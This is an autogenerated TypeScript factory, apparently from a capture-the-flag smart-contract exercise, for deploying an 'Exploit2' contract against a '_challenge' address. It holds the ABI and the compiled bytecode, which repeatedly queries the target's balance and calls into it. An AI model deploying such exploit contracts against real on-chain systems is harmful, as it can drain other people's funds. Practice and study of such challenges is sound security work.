/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import {
  Signer,
  utils,
  Contract,
  ContractFactory,
  PayableOverrides,
} from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { Exploit2, Exploit2Interface } from "../Exploit2";

const _abi = [
  {
    inputs: [
      {
        internalType: "address payable",
        name: "_challenge",
        type: "address",
      },
    ],
    stateMutability: "payable",
    type: "constructor",
  },
  {
    stateMutability: "payable",
    type: "fallback",
  },
  {
    inputs: [],
    name: "finalize",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const _bytecode =
  "0x6080604052604051610943380380610943833981810160405281019061002591906100ce565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100fb565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061009b82610070565b9050919050565b6100ab81610090565b81146100b657600080fd5b50565b6000815190506100c8816100a2565b92915050565b6000602082840312156100e4576100e361006b565b5b60006100f2848285016100b9565b91505092915050565b6108398061010a6000396000f3fe6080604052600436106100225760003560e01c80634bb278f31461002557610023565b5b005b34801561003157600080fd5b5061003a61003c565b005b6100f1633b9aca0060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b815260040160206040518083038186803b1580156100aa57600080fd5b505afa1580156100be573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100e291906106f0565b6100ec919061074c565b6105f3565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e614cc3306040518263ffffffff1660e01b815260040161014a91906107be565b600060405180830381600087803b15801561016457600080fd5b505af1158015610178573d6000803e3d6000fd5b50505050610231633b9aca0060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b815260040160206040518083038186803b1580156101ea57600080fd5b505afa1580156101fe573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061022291906106f0565b61022c919061074c565b6105f3565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e614cc3306040518263ffffffff1660e01b815260040161028a91906107be565b600060405180830381600087803b1580156102a457600080fd5b505af11580156102b8573d6000803e3d6000fd5b50505050610371633b9aca0060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b815260040160206040518083038186803b15801561032a57600080fd5b505afa15801561033e573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061036291906106f0565b61036c919061074c565b6105f3565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e614cc3306040518263ffffffff1660e01b81526004016103ca91906107be565b600060405180830381600087803b1580156103e457600080fd5b505af11580156103f8573d6000803e3d6000fd5b505050506104b1633b9aca0060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b815260040160206040518083038186803b15801561046a57600080fd5b505afa15801561047e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104a291906106f0565b6104ac919061074c565b6105f3565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e614cc3306040518263ffffffff1660e01b815260040161050a91906107be565b600060405180830381600087803b15801561052457600080fd5b505af1158015610538573d6000803e3d6000fd5b505050506105f1633b9aca0060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166312065fe06040518163ffffffff1660e01b815260040160206040518083038186803b1580156105aa57600080fd5b505afa1580156105be573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105e291906106f0565b6105ec919061074c565b6105f3565b565b6106898160405160240161060791906107e8565b6040516020818303038152906040527ff5b1bba9000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061068c565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b600080fd5b6000819050919050565b6106cd816106ba565b81146106d857600080fd5b50565b6000815190506106ea816106c4565b92915050565b600060208284031215610706576107056106b5565b5b6000610714848285016106db565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000610757826106ba565b9150610762836106ba565b9250826107725761077161071d565b5b828204905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006107a88261077d565b9050919050565b6107b88161079d565b82525050565b60006020820190506107d360008301846107af565b92915050565b6107e2816106ba565b82525050565b60006020820190506107fd60008301846107d9565b9291505056fea264697066735822122027858c2d248267810d8f35950ca2245435be05178169a84538992f45f496820f64736f6c63430008090033";

type Exploit2ConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: Exploit2ConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class Exploit2__factory extends ContractFactory {
  constructor(...args: Exploit2ConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "Exploit2";
  }

  deploy(
    _challenge: string,
    overrides?: PayableOverrides & { from?: string | Promise<string> }
  ): Promise<Exploit2> {
    return super.deploy(_challenge, overrides || {}) as Promise<Exploit2>;
  }
  getDeployTransaction(
    _challenge: string,
    overrides?: PayableOverrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_challenge, overrides || {});
  }
  attach(address: string): Exploit2 {
    return super.attach(address) as Exploit2;
  }
  connect(signer: Signer): Exploit2__factory {
    return super.connect(signer) as Exploit2__factory;
  }
  static readonly contractName: "Exploit2";
  public readonly contractName: "Exploit2";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): Exploit2Interface {
    return new utils.Interface(_abi) as Exploit2Interface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): Exploit2 {
    return new Contract(address, _abi, signerOrProvider) as Exploit2;
  }
}
